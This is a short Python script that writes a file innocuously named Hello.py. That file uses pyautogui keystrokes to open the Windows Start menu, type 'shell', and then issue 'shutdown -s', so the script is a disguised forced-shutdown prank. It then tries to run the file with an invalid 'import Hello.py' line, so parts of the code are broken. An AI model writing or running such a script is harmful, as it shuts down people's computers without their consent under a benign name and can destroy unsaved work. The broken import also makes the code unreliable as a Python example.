import pyautogui as pg, os, sys, time
HelloFile = open('Hello.py', 'w')
HelloFile.write(
"""
import pyautogui as pg, os, sys, time
pg.hotkey('winleft')
pg.typewrite('shell\\n')
time.sleep(2)
pg.typewrite('shutdown -s\\n')



"""
)
HelloFile.close()

import Hello.py

